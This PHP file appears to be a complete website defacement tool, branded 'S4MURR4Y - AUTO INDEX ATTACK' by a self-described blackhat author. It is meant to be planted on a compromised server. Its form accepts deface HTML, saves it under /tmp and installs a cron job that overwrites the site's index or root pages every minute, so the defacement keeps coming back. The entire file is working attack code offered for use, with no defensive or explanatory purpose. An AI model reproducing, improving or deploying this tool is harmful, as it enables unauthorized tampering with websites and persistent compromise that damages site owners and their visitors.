<?php
// You can edit the style
// But please do not change the original author and the copyright.
// Author: Mc'Sl0vv - Idiot BlackHat
function defscr(){
	echo "
<html>
	<head>
		<title>S4MURR4Y - AUTO INDEX ATTACK</title>
	</head>
	<style>
		html{
			background-color: black;
			color: white;
			font-family: 'Times New Roman';
			text-align: center;
			font-size: 20px;
		}
		red{color:red;}lime{color:lime;}cyan{color:cyan;}
		input,textarea,select{
			background-color: transparent;
			border: 2px solid red;
			color: white;
		}
	</style>
	<body>
		<font><b>S4MURR4Y - AUTO <red>INDEX</red> ATTACK</b><br><br>
			<form method='post'><select name='method'>
				<option selected='selected' value='noselected'>Attack Method</option>
				<option value='index'>Index Attack</option>
				<option value='nonindex'>Non Index Attack</option>
				</select><br>
			<br>Deface Script:<br>
			<textarea rows='20' cols='50' name='script' placeholder='&lt;h1&gt;Hacked By You&lt;/h1&gt;'></textarea><br><br><input style='padding: 5px 90px;' type='submit' name='attack' value='ATTACK'></input>
		</body>
		<footer>
				<br><strong style='font-size:15px;'>Copyright &copy; Mc'Sl0vv ".date('Y')."
";
}
function refresh(){
	echo '<meta http-equiv="refresh" content="0"/>';
}
	if(function_exists('exec')){
if(file_exists('/tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt')){
	echo '<body bgcolor="black"><center><strong style="color: red;"> AUTO INDEX IS ALREADY USED<br>Edit <i style="color: lime;">/tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt</i> to change the script/deface display.</strong></center>';
} 

elseif($_POST['attack']){
	$method=$_POST['method'];
	$script=$_POST['script'];
	if($method == 'noselected'){
		defscr();
		echo '<script>alert("Please Choose The Attack Method.")</script>';
		} elseif ($method == 'index'){
			
	$docroot=$_SERVER['DOCUMENT_ROOT'];
	$site=$_SERVER['SERVER_NAME'];
	$theindex=$docroot . '/';
	$s4mindex='/tmp/s4murr4y_'.$site.'.sh';
	$s4mindexsource='cp /tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt ' . $theindex . 'index.php && cp /tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt ' . $theindex . 'index.html';
	$scriptpath='/tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt';
	$scriptsource=$script;
	file_put_contents($scriptpath, $scriptsource);
	$output = shell_exec('crontab -l');
file_put_contents('/tmp/crontab.txt', $output.'* * * * * sh '.$s4mindex.''.PHP_EOL);
echo exec('crontab /tmp/crontab.txt');
	if(file_put_contents($s4mindex, $s4mindexsource) == true){
		refresh();
		echo "<script>alert('Success')</script>";
	} else {
		echo "<script>alert('cannot create ".$s4mindex.".')</script>";
}
		
	
		} elseif($method == 'nonindex'){
			
	$docroot=$_SERVER['DOCUMENT_ROOT'];
	$site=$_SERVER['SERVER_NAME'];
	$theindex=$docroot . '/';
	$s4mindex='/tmp/s4murr4y_'.$site.'_nonindex.sh';
	$s4mindexsource='cp /tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt ' . $theindex . 'root.php && cp /tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt ' . $theindex . 'root.html';
	$scriptpath='/tmp/s4murr4y_'.$_SERVER['SERVER_NAME'].'.txt';
	$scriptsource=$script;
	file_put_contents($scriptpath, $scriptsource);
	$output = shell_exec('crontab -l');
file_put_contents('/tmp/crontab.txt', $output.'* * * * * sh '.$s4mindex.''.PHP_EOL);
echo exec('crontab /tmp/crontab.txt');
	if(file_put_contents($s4mindex, $s4mindexsource) == true){
		refresh();
		echo "<script>alert('Success')</script>";
	} else {
		echo "<script>alert('cannot create ".$s4mindex.".')</script>";
}
		
	
		}
	}
else{
	$docroot=$_SERVER['DOCUMENT_ROOT'];
	defscr();
	}
} else{
	echo "<body bgcolor='black'><h1 style='color:red;'><center>This tool cannot be used if function 'system' is disabled.</center></h1>";
	}


?>